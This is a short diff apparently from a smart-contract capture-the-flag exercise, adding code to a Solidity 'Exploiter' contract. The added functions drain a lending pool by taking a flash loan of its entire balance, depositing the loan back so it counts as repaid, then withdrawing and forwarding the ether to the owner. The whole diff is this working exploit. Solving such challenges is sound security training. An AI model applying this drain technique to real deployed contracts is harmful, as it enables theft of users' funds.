@@ -55,4 +55,15 @@ contract Exploiter {
     receive() external payable {}
 
     // Write your exploit code below
+    function attack() external {
+        uint256 balance = address(pool).balance;
+        pool.flashLoan(balance);
+        pool.withdraw();
+        (bool ok, ) = owner.call{value: balance}("");
+        require(ok, "Transfer failure");
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
 }
